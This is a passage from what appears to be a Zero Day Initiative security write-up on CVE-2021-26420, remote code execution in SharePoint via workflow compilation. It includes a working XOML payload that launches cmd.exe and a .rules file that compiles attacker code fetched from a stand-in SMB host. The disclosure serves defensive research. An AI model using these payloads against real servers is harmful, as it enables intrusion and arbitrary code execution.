          <td id="file-cve-2021-26420-snippet-2-cs-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">WorkflowCompilerResults</span> <span class="pl-s1">workflowCompilerResults</span><span class="pl-c1">=</span> <span class="pl-s1">workflowCompilerInternal</span><span class="pl-kos">.</span><span class="pl-en">Compile</span><span class="pl-kos">(</span><span class="pl-s1">parameters</span><span class="pl-kos">,</span> <span class="pl-s1">files</span><span class="pl-kos">)</span><span class="pl-kos">;</span><span class="pl-kos"></span></td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/9d2d3ac1d37b120664b13d133524f5a6/raw/cf99e0f5c7467ff5cb84c947ee6fe09e303e989a/CVE-2021-26420-snippet-2.cs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/9d2d3ac1d37b120664b13d133524f5a6#file-cve-2021-26420-snippet-2-cs" class="Link--inTextBlock">
          CVE-2021-26420-snippet-2.cs
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_56030"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">From here we see that the bulk of the implementation of <strong>WorkflowCompiler.Compile</strong> resides a different class named <strong>WorkflowCompilerInternal</strong>. This class is not blocked by <strong><em>authorizedTypes</em></strong> list. Furthermore, since it is found within the `<strong>System.Workflow</strong>` namespace, it is allowed by the line:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/795292728999892f950554ee6ab9eb56.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_56487"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_74" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/795292728999892f950554ee6ab9eb56.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201088" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-3-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-3.xml content, created by zdi-team on 02:23PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-3.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-3-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-3-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">authorizedType</span> <span class="pl-e">Assembly</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35<span class="pl-pds">"</span></span> <span class="pl-e">Namespace</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Workflow.*<span class="pl-pds">"</span></span> <span class="pl-e">TypeName</span>=<span class="pl-s"><span class="pl-pds">"</span>*<span class="pl-pds">"</span></span> <span class="pl-e">Authorized</span>=<span class="pl-s"><span class="pl-pds">"</span>True<span class="pl-pds">"</span></span> /&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/795292728999892f950554ee6ab9eb56/raw/fd69c1abf818534bc44021a73ce890db0bf97e90/CVE-2021-26420-snippet-3.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/795292728999892f950554ee6ab9eb56#file-cve-2021-26420-snippet-3-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-3.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_57941"><div class="sqs-block-content"><p>Therefore, we can compile an arbitrary workflow by invoking the <b data-preserve-html-node="true">WorkflowCompilerInternal</b> type directly.</p>
<p>For arbitrary code execution, we can use the following XOML file <b data-preserve-html-node="true">(<code>Attck.xoml</code>)</b>. When compiled, it will execute the desired .NET commands, provided that the <b data-preserve-html-node="true"><i data-preserve-html-node="true">noCode</i></b> flag is not specified:</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/7d982428924d06e8b5b8404250076ba1.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_59640"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_77" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/7d982428924d06e8b5b8404250076ba1.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201095" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-4-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-4.xml content, created by zdi-team on 02:23PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-4.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">SequentialWorkflowActivity</span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Class</span>=<span class="pl-s"><span class="pl-pds">"</span>MyWorkflow<span class="pl-pds">"</span></span> <span class="pl-e">x</span><span class="pl-e">:</span><span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>MyWorkflow<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>http://schemas.microsoft.com/winfx/2006/xaml<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://schemas.microsoft.com/winfx/2006/xaml/workflow<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC2" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">x</span><span class="pl-ent">:</span><span class="pl-ent">Code</span>&gt;<span class="pl-s"><span class="pl-pds">&lt;![CDATA[</span> class Rce : SequentialWorkflowActivity </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-s">    { </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-s">        public Rce(){ </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-s">            Object res=System.Diagnostics.Process.Start("cmd.exe","/c echo RCE &gt; c:/windows/temp/PoC_SPRCE02.txt"); </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-s">        } </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-s">    }    <span class="pl-pds">]]&gt;</span></span>&lt;/<span class="pl-ent">x</span><span class="pl-ent">:</span><span class="pl-ent">Code</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-4-xml-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-26420-snippet-4-xml-LC8" class="blob-code blob-code-inner js-file-line">&lt;/<span class="pl-ent">SequentialWorkflowActivity</span>&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/7d982428924d06e8b5b8404250076ba1/raw/d1d437a82e12a167c0a2561c7d1d043ea112369f/CVE-2021-26420-snippet-4.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/7d982428924d06e8b5b8404250076ba1#file-cve-2021-26420-snippet-4-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-4.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_60285"><div class="sqs-block-content"><p>Here is the .rules file (<code>WF02.rules</code>) of a SharePoint workflow that invokes the <b data-preserve-html-node="true"><i data-preserve-html-node="true">WorkflowCompilerInternal.Compile</i></b> to compile an arbitrary XOML workflow definition, provided that the XOML file can be retrieved from an SMB share:</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/4e5ba12636f88c141bdc5ef2d7c1ca15.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_61644"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_80" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/4e5ba12636f88c141bdc5ef2d7c1ca15.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201100" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-5-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-5.xml content, created by zdi-team on 02:23PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-5.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">RuleDefinitions</span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://schemas.microsoft.com/winfx/2006/xaml/workflow<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC2" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">RuleDefinitions</span>.Conditions&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC3" class="blob-code blob-code-inner js-file-line">        &lt;<span class="pl-ent">RuleExpressionCondition</span> <span class="pl-e">Name</span>=<span class="pl-s"><span class="pl-pds">"</span>__Rule_ID3<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC4" class="blob-code blob-code-inner js-file-line">            &lt;<span class="pl-ent">RuleExpressionCondition</span>.Expression&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC5" class="blob-code blob-code-inner js-file-line">                &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span> <span class="pl-e">Operator</span>=<span class="pl-s"><span class="pl-pds">"</span>ValueEquality<span class="pl-pds">"</span></span>  </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC6" class="blob-code blob-code-inner js-file-line">                <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">ns0</span>=<span class="pl-s"><span class="pl-pds">"</span>clr-namespace:System.CodeDom;Assembly=System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC7" class="blob-code blob-code-inner js-file-line">                <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">ns2</span>=<span class="pl-s"><span class="pl-pds">"</span>clr-namespace:System;Assembly=mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089<span class="pl-pds">"</span></span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC8" class="blob-code blob-code-inner js-file-line">                <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>http://schemas.microsoft.com/winfx/2006/xaml<span class="pl-pds">"</span></span>  </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC9" class="blob-code blob-code-inner js-file-line">                &gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC10" class="blob-code blob-code-inner js-file-line">                    &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span>.Left&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC11" class="blob-code blob-code-inner js-file-line">                        &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC12" class="blob-code blob-code-inner js-file-line">                            &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>.Parameters&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC13" class="blob-code blob-code-inner js-file-line">                                &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC14" class="blob-code blob-code-inner js-file-line">                                    &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC15" class="blob-code blob-code-inner js-file-line">                                        &lt;<span class="pl-ent">ns1</span><span class="pl-ent">:</span><span class="pl-ent">WorkflowCompilerParameters</span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">ns1</span>=<span class="pl-s"><span class="pl-pds">"</span>clr-namespace:System.Workflow.ComponentModel.Compiler;Assembly=System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC16" class="blob-code blob-code-inner js-file-line">                                    &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC17" class="blob-code blob-code-inner js-file-line">                                &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC18" class="blob-code blob-code-inner js-file-line">                                &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC19" class="blob-code blob-code-inner js-file-line">                                    &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC20" class="blob-code blob-code-inner js-file-line">                                        &lt;<span class="pl-ent">x</span><span class="pl-ent">:</span><span class="pl-ent">Array</span> <span class="pl-e">Type</span>=<span class="pl-s"><span class="pl-pds">"</span>{x:Type ns2:String}<span class="pl-pds">"</span></span> &gt;                                         &lt;<span class="pl-ent">ns2</span><span class="pl-ent">:</span><span class="pl-ent">String</span>&gt;//AttackerSMBserver/share/Attck.xoml&lt;/<span class="pl-ent">ns2</span><span class="pl-ent">:</span><span class="pl-ent">String</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC21" class="blob-code blob-code-inner js-file-line">                                        &lt;/<span class="pl-ent">x</span><span class="pl-ent">:</span><span class="pl-ent">Array</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC22" class="blob-code blob-code-inner js-file-line">                                    &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC23" class="blob-code blob-code-inner js-file-line">                                &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC24" class="blob-code blob-code-inner js-file-line">                            &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>.Parameters&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC25" class="blob-code blob-code-inner js-file-line">                            &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>.Method&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC26" class="blob-code blob-code-inner js-file-line">                                &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodReferenceExpression</span> <span class="pl-e">MethodName</span>=<span class="pl-s"><span class="pl-pds">"</span>Compile<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC27" class="blob-code blob-code-inner js-file-line">                                    &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodReferenceExpression</span>.TargetObject&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC28" class="blob-code blob-code-inner js-file-line">                                        &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC29" class="blob-code blob-code-inner js-file-line">                                            &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC30" class="blob-code blob-code-inner js-file-line">                                                &lt;<span class="pl-ent">ns1</span><span class="pl-ent">:</span><span class="pl-ent">WorkflowCompilerInternal</span> <span class="pl-e">xmlns</span><span class="pl-e">:</span><span class="pl-e">ns1</span>=<span class="pl-s"><span class="pl-pds">"</span>clr-namespace:System.Workflow.ComponentModel.Compiler;Assembly=System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC31" class="blob-code blob-code-inner js-file-line">                                            &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>.Value&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC32" class="blob-code blob-code-inner js-file-line">                                        &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC33" class="blob-code blob-code-inner js-file-line">                                    &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodReferenceExpression</span>.TargetObject&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC34" class="blob-code blob-code-inner js-file-line">                                &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodReferenceExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC35" class="blob-code blob-code-inner js-file-line">                            &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>.Method&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC36" class="blob-code blob-code-inner js-file-line">                        &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeMethodInvokeExpression</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC37" class="blob-code blob-code-inner js-file-line">                    &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span>.Left&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC38" class="blob-code blob-code-inner js-file-line">                    &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span>.Right&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC39" class="blob-code blob-code-inner js-file-line">                        &lt;<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodePrimitiveExpression</span> <span class="pl-e">Value</span>=<span class="pl-s"><span class="pl-pds">"</span>{x:Null}<span class="pl-pds">"</span></span> /&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC40" class="blob-code blob-code-inner js-file-line">                    &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span>.Right&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-5-xml-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-cve-2021-26420-snippet-5-xml-LC41" class="blob-code blob-code-inner js-file-line">                &lt;/<span class="pl-ent">ns0</span><span class="pl-ent">:</span><span class="pl-ent">CodeBinaryOperatorExpression</span>&gt; </td>
        </tr>
        <tr>
